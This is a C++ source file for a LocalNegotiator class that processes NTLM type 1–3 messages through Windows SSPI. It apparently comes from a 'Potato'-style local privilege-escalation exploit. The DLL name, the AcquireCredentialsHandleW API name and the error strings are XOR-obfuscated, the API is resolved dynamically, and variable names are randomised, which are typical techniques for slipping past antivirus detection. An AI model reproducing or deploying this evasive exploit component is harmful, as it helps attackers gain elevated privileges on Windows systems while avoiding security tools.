#include "stdafx.h"
#include "LocalNegotiator.h"
#include <iostream>

LocalNegotiator::LocalNegotiator()
{
	authResult = -1;
}

void InitTokenContextBuffer(PSecBufferDesc pSecBufferDesc, PSecBuffer pSecBuffer)
{
	pSecBuffer->BufferType = SECBUFFER_TOKEN;
	pSecBuffer->cbBuffer = 0;
	pSecBuffer->pvBuffer = nullptr;

	pSecBufferDesc->ulVersion = SECBUFFER_VERSION;
	pSecBufferDesc->cBuffers = 1;
	pSecBufferDesc->pBuffers = pSecBuffer;
}

int LocalNegotiator::handleType1(char * ntlmBytes, int len)
{
	
	 char  hid_Error__YMkdo9cbM0He[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x2c','\x2b','\x65','\x4','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x45'};
 char k_nbGPLGkhofpT = '\x45';
for(int i = 0; i < sizeof(hid_Error__YMkdo9cbM0He) / sizeof(hid_Error__YMkdo9cbM0He[0]); i++){
hid_Error__YMkdo9cbM0He[i] = hid_Error__YMkdo9cbM0He[i] ^ k_nbGPLGkhofpT;
}
	typedef SECURITY_STATUS(__stdcall* _AcquireCredentialsHandleW)(LPWSTR pPrincipal,LPWSTR pPackage,unsigned long    fCredentialUse,void             *pvLogonId,void             *pAuthData,SEC_GET_KEY_FN   pGetKeyFn,void             *pvGetKeyArgument,PCredHandle      phCredential,PTimeStamp       ptsExpiry);
	TCHAR  hid_Secur__sFBv4Ot2rPe0[] = {'\x16','\x20','\x26','\x30','\x37','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_XmHRcmgD4KiS = '\x45';
for(int i = 0; i < sizeof(hid_Secur__sFBv4Ot2rPe0) / sizeof(hid_Secur__sFBv4Ot2rPe0[0]); i++){
hid_Secur__sFBv4Ot2rPe0[i] = hid_Secur__sFBv4Ot2rPe0[i] ^ k_XmHRcmgD4KiS;
}

	HMODULE hid_hHandl_LreFVcujRQ0U = LoadLibrary(hid_Secur__sFBv4Ot2rPe0);
	char  hid_Acquir_98niko6roDd9[] = {'\x4','\x26','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x12','\x45'};
char k_hOiG9JwOCWVk = '\x45';
for(int i = 0; i < sizeof(hid_Acquir_98niko6roDd9) / sizeof(hid_Acquir_98niko6roDd9[0]); i++){
hid_Acquir_98niko6roDd9[i] = hid_Acquir_98niko6roDd9[i] ^ k_hOiG9JwOCWVk;
}

	_AcquireCredentialsHandleW hid_Acquir_I2KmaZGYY2ez = (_AcquireCredentialsHandleW) GetProcAddress(hid_hHandl_LreFVcujRQ0U, hid_Acquir_98niko6roDd9);
TCHAR lpPackageName[1024] = L"Negotiate";
	TimeStamp ptsExpiry;

	int status = hid_Acquir_I2KmaZGYY2ez(
		NULL,
		lpPackageName,
		SECPKG_CRED_INBOUND,
		NULL,
		NULL,
		0,
		NULL,
		&hCred,
		&ptsExpiry);

	if (status != SEC_E_OK)
	{
		printf(hid_Error__YMkdo9cbM0He);
		return -1;
	}

	InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
	InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);

	phContext = new CtxtHandle();

	secClientBuffer.cbBuffer = static_cast<unsigned long>(len);
	secClientBuffer.pvBuffer = ntlmBytes;

	ULONG fContextAttr;
	TimeStamp tsContextExpiry;

	status = AcceptSecurityContext(
		&hCred,
		nullptr,
		&secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		//STANDARD_CONTEXT_ATTRIBUTES,
		SECURITY_NATIVE_DREP,
		phContext,
		&secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry);

	return status;
}

int LocalNegotiator::handleType2(char * ntlmBytes, int len)
{
	
	 char  hid_Buffer_som2rrcMkW2U[] = {'\x7','\x30','\x23','\x23','\x20','\x37','\x65','\x36','\x2c','\x3f','\x20','\x36','\x65','\x2c','\x2b','\x26','\x2a','\x28','\x35','\x24','\x31','\x2c','\x27','\x29','\x20','\x65','\x68','\x65','\x26','\x24','\x2b','\x62','\x31','\x65','\x37','\x20','\x35','\x29','\x24','\x26','\x20','\x45'};
 char k_7NJ5Bmtlpy1y = '\x45';
for(int i = 0; i < sizeof(hid_Buffer_som2rrcMkW2U) / sizeof(hid_Buffer_som2rrcMkW2U[0]); i++){
hid_Buffer_som2rrcMkW2U[i] = hid_Buffer_som2rrcMkW2U[i] ^ k_7NJ5Bmtlpy1y;
}
char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;
	if (len >= secServerBuffer.cbBuffer) {
		for (int i = 0; i < len; i++)
		{
			if (i < secServerBuffer.cbBuffer) {
				ntlmBytes[i] = newNtlmBytes[i];
			}
			else {
				ntlmBytes[i] = 0x00;
			}
		}
	}
	else {
		printf(hid_Buffer_som2rrcMkW2U);
	}

	return 0;
}

int LocalNegotiator::handleType3(char * ntlmBytes, int len)
{
	InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
	InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);

	secClientBuffer.cbBuffer = static_cast<unsigned long>(len);
	secClientBuffer.pvBuffer = ntlmBytes;

	ULONG fContextAttr;
	TimeStamp tsContextExpiry;
	int status = AcceptSecurityContext(
		&hCred,
		phContext,
		&secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		//STANDARD_CONTEXT_ATTRIBUTES,
		SECURITY_NATIVE_DREP,
		phContext,
		&secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry);

	authResult = status;

	return status;
}
